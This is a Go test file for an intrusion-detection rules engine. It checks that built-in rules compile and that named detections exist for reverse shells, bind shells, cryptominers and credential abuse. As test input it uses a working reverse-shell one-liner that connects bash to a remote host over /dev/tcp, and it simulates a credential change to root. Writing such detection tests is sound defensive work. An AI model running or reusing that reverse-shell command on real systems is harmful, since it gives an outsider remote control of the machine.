package rules

import (
	"log"
	"os"
	"path/filepath"
	"runtime"
	"testing"
)

func TestBuiltinRulesCompile(t *testing.T) {
	// Find the builtin rules directory relative to this test file.
	_, thisFile, _, _ := runtime.Caller(0)
	builtinDir := filepath.Join(filepath.Dir(thisFile), "builtin")

	if _, err := os.Stat(builtinDir); err != nil {
		t.Skipf("builtin rules directory not found: %v", err)
	}

	var alerts []Alert
	logger := log.New(os.Stderr, "[builtin-test] ", 0)
	engine, err := NewEngine(builtinDir, "", logger, func(alert Alert) {
		alerts = append(alerts, alert)
	})
	if err != nil {
		t.Fatalf("NewEngine with builtin rules: %v", err)
	}
	defer engine.Close()

	count := engine.RuleCount()
	t.Logf("builtin rules compiled: %d", count)
	if count == 0 {
		t.Error("expected at least 1 builtin rule to compile")
	}

	names := engine.RuleNames()
	t.Logf("rule names: %v", names)

	// Verify some expected rules exist.
	expectedRules := []string{
		"Shell spawned by web server",
		"Reverse shell command detected",
		"Cryptominer process detected",
		"Sensitive credential file access",
		"ptrace process injection",
		"Credential change to root",
		"Shell making outbound connection",
		"Bind shell detection",
	}

	ruleSet := make(map[string]bool)
	for _, n := range names {
		ruleSet[n] = true
	}

	for _, expected := range expectedRules {
		if !ruleSet[expected] {
			t.Errorf("expected builtin rule %q not found", expected)
		}
	}

	// Test that a reverse shell rule fires.
	matches := engine.Evaluate(EventVars{
		EvtType:     "execve",
		EvtSource:   "ebpf",
		ProcName:    "bash",
		ProcCmdline: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		ProcPID:     1234,
	})

	if matches == 0 {
		t.Error("expected reverse shell rule to fire")
	}
	t.Logf("reverse shell test: %d rules matched, %d alerts fired", matches, len(alerts))

	// Test credential escalation.
	alerts = nil
	matches = engine.Evaluate(EventVars{
		EvtType:    "cred_change",
		EvtSource:  "ebpf",
		ProcName:   "su",
		ProcPID:    5678,
		CredOldUID: 1000,
		CredNewUID: 0,
	})

	if matches == 0 {
		t.Error("expected cred change to root rule to fire")
	}
	t.Logf("cred escalation test: %d rules matched, %d alerts fired", matches, len(alerts))
}
